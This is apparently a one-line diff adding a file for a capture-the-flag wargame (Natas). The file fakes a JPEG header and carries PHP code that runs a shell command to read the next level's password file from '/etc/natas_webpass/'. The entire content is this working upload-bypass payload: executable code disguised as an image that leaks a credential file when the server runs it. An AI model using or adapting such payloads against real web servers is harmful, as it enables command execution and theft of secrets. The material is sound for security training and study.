@@ -1,0 +1,1 @@
+ÿØÿ\XE0<?echo exec('cat /etc/natas_webpass/natas12');?>
